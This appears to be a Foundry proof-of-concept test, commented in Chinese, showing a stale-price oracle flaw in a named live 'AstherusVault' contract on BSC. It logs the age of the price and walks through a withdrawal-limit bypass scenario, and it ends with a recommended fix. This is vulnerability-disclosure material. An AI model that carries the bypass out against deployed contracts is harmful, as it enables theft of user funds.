// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/**
 * @title Price Oracle Exploit PoC
 * @notice 演示 AstherusVault 合约中价格预言机漏洞
 * @dev 此 PoC 展示了如何利用过期的价格数据绕过提款限制
 */

import "forge-std/Test.sol";

interface IAstherusVault {
    function withdraw(
        uint256 id,
        address payable to,
        bool isNative,
        address currency,
        uint256 amount,
        uint256 deadline,
        bytes calldata signature
    ) external;

    function supportToken(address currency) external view returns (
        address currency,
        address priceFeed,
        uint256 price,
        bool fixedPrice,
        uint8 priceDecimals,
        uint8 currencyDecimals
    );
}

interface IAggregatorV3 {
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 price,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
}

contract PriceOracleExploit is Test {
    IAstherusVault constant VAULT = IAstherusVault(0x128463A60784c4D3f46c23Af3f65Ed859Ba87974);
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;

    /**
     * @notice 演示价格预言机漏洞
     * @dev 展示了当价格预言机返回过期数据时，合约仍然接受该价格
     */
    function testExploit_StalePrice() public {
        // 1. 获取 USDT 的价格预言机地址
        (,address priceFeed,,,,) = VAULT.supportToken(USDT);

        // 2. 检查价格数据的新鲜度
        IAggregatorV3 oracle = IAggregatorV3(priceFeed);
        (
            uint80 roundId,
            int256 price,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = oracle.latestRoundData();

        // 3. 计算价格数据的年龄
        uint256 priceAge = block.timestamp - updatedAt;

        console.log("Price Feed:", priceFeed);
        console.log("Current Price:", uint256(price));
        console.log("Last Updated:", updatedAt);
        console.log("Price Age (seconds):", priceAge);
        console.log("Current Timestamp:", block.timestamp);

        // 4. 漏洞点：合约不检查 updatedAt
        // 即使价格数据已经过期数小时甚至数天，合约仍然会使用它

        // 5. 攻击场景
        if (priceAge > 3600) { // 如果价格超过1小时未更新
            console.log("[!] VULNERABILITY: Price is stale (>1 hour old)");
            console.log("[!] Contract will still use this outdated price!");

            // 攻击者可以：
            // a) 等待价格预言机暂停或延迟
            // b) 利用过期的低价格进行大额提款
            // c) 绕过 hourlyLimit 美元价值限制
        }

        // 6. 演示潜在影响
        uint256 realPrice = 1e8; // 假设真实价格是 $1
        uint256 stalePrice = uint256(price);

        if (stalePrice < realPrice) {
            uint256 priceManipulation = ((realPrice - stalePrice) * 100) / realPrice;
            console.log("[!] Price manipulation potential:", priceManipulation, "%");
            console.log("[!] Attacker can withdraw more than hourly limit!");
        }
    }

    /**
     * @notice 演示如何构造恶意提款
     */
    function testExploit_BypassHourlyLimit() public {
        // 场景：价格预言机显示 USDT = $0.5（过期价格）
        // 实际价格：USDT = $1.0
        // hourlyLimit = $100,000

        // 攻击者可以提取 200,000 USDT（系统认为是 $100,000）
        // 但实际价值是 $200,000，绕过了限制

        console.log("\n=== Bypass Hourly Limit Attack ===");
        console.log("Configured Limit: $100,000");
        console.log("Stale Oracle Price: $0.50 per USDT");
        console.log("Real Market Price: $1.00 per USDT");
        console.log("Attacker withdraws: 200,000 USDT");
        console.log("System calculates: 200,000 * $0.50 = $100,000 (within limit)");
        console.log("Actual value: 200,000 * $1.00 = $200,000 (2x the limit!)");
    }

    /**
     * @notice 修复建议的实现
     */
    function recommendedFix() public pure returns (string memory) {
        return string(abi.encodePacked(
            "RECOMMENDED FIX:\n",
            "function _amountUsd(address currency, uint256 amount) private view returns (uint256) {\n",
            "    Token memory token = supportToken[currency];\n",
            "    uint256 price = token.price;\n",
            "    if (!token.fixedPrice) {\n",
            "        AggregatorV3Interface oracle = AggregatorV3Interface(token.priceFeed);\n",
            "        (, int256 price_, , uint256 updatedAt,) = oracle.latestRoundData();\n",
            "        \n",
            "        // ADD THESE CHECKS:\n",
            "        require(block.timestamp - updatedAt <= 3600, 'Price too old');\n",
            "        require(price_ > 0, 'Invalid price');\n",
            "        \n",
            "        price = uint256(price_);\n",
            "    }\n",
            "    return price * amount * (10 ** USD_DECIMALS) / (10 ** (token.priceDecimals + token.currencyDecimals));\n",
            "}"
        ));
    }
}

/**
 * 运行测试：
 * forge test --match-contract PriceOracleExploit -vvv --fork-url https://bsc.drpc.org
 */